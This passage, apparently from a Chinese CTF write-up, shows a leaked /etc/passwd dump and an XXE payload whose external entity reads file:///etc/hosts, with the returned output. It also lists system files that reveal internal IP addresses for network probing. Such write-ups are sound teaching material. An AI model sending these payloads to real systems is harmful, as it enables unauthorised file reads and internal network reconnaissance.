charset=UTF-8\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false</code></pre><p>还可以进行内网探测：</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE xxe [\n&lt;!ELEMENT name ANY &gt;\n&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot; &gt;]&gt;\n&lt;root&gt;\n&lt;name&gt;&amp;xxe;&lt;/name&gt;\n&lt;/root&gt;\n\n127.0.0.1    localhost\n::1    localhost ip6-localhost ip6-loopback\nfe00::0    ip6-localnet\nff00::0    ip6-mcastprefix\nff02::1    ip6-allnodes\nff02::2    ip6-allrouters\n174.0.56.234    283819a6c89d</code></pre><p>常用的内网 IP 文件<code>/etc/hosts</code> 、 <code>/proc/net/arp</code> 、 <code>/proc/net/fib_trie</code></p>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}]}